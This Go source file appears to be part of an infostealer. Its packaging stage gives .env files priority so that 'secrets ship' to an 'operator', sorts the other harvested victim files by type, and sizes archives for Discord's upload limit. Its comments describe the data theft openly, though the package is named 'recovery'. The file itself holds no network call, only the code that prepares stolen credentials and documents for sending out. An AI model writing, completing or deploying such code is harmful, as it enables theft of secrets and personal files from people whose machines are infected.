// export_files.go — phase-2 scanned-file packaging and .env placement.
//
// .env files are promoted into the primary harvest (env/) so secrets ship even
// if the operator never downloads the larger files zip. Other scanned files go
// under files/{documents,images,other}/ with per-file size caps.
package main

import (
	"fmt"
	"path/filepath"
	"strings"

	"recovery/recovery"
)

// Cap individual scanned files so one huge item cannot force a whole zip over limit.
// Leave room under maxDiscordUpload for zip/multipart overhead.
const maxScannedFileUploadSize = maxDiscordUpload - 3*1024*1024

// isEnvScannedFile detects dotenv-style names that belong in the primary harvest.
func isEnvScannedFile(f recovery.FileResult) bool {
	name := strings.ToLower(f.Name)
	if name == ".env" || strings.HasPrefix(name, ".env.") {
		return true
	}
	return strings.ToLower(f.Ext) == ".env"
}

func appendEnvFileEntries(entries []archiveEntry, p *harvestPayload, seen map[string]bool) []archiveEntry {
	if p == nil || p.Result == nil {
		return entries
	}

	usedZip := make(map[string]int)
	add := func(path, name string) {
		if path == "" || seen[path] {
			return
		}
		seen[path] = true
		zipPath := uniqueFolder(envFileZipPath(path, name), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: path,
		})
	}

	for _, key := range p.Result.Keys {
		if key.Type != "env" {
			continue
		}
		add(key.Path, key.Name)
	}
	for _, f := range p.Result.Files {
		if !isEnvScannedFile(f) {
			continue
		}
		add(f.Path, f.Name)
	}
	return entries
}

func buildScannedFileEntries(p *harvestPayload, maxFileBytes int64) (entries []archiveEntry, skippedLarge int) {
	if p == nil || p.Result == nil {
		return nil, 0
	}
	if maxFileBytes <= 0 {
		maxFileBytes = int64(maxScannedFileUploadSize)
	}

	usedZip := make(map[string]int)
	for _, f := range p.Result.Files {
		if isEnvScannedFile(f) {
			continue
		}
		if f.Size > maxFileBytes {
			skippedLarge++
			continue
		}
		zipPath := uniqueFolder(scannedFileZipPath(f), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: f.Path,
		})
	}
	return entries, skippedLarge
}

func envFileZipPath(fullPath, name string) string {
	parent := filepath.Base(filepath.Dir(fullPath))
	if parent == "" || parent == "." {
		parent = "root"
	}
	return "env/" + sanitizeFilename(parent) + "/" + name
}

func scannedFileZipPath(f recovery.FileResult) string {
	dir := f.Dir
	if dir == "" {
		dir = "Unknown"
	}
	category := scannedFileCategory(f)
	return fmt.Sprintf("%s%s/%s", category, sanitizeFilename(dir), f.Name)
}

func scannedFileCategory(f recovery.FileResult) string {
	ext := strings.ToLower(strings.TrimPrefix(f.Ext, "."))
	if isImageExt(ext) {
		return "files/images/"
	}
	if isDocumentExt(ext) {
		return "files/documents/"
	}
	return "files/other/"
}

func isImageExt(ext string) bool {
	switch ext {
	case "jpg", "jpeg", "png", "gif", "webp", "heic", "heif", "bmp", "tif", "tiff", "svg", "ico":
		return true
	default:
		return false
	}
}

func isDocumentExt(ext string) bool {
	switch ext {
	case "pdf", "txt", "text", "md", "rtf", "csv", "tsv", "json", "xml", "html", "htm",
		"doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp",
		"pages", "numbers", "key", "log":
		return true
	default:
		return false
	}
}

func scannedFilesSummary(count, skippedLarge int) string {
	summary := fmt.Sprintf("Scanned files: %d\nPDF, TXT, images, documents, and other matched files.", count)
	if skippedLarge > 0 {
		summary += fmt.Sprintf("\nSkipped %d file(s) over %d MB (Discord upload limit).", skippedLarge, maxScannedFileUploadSize/(1024*1024))
	}
	return summary
}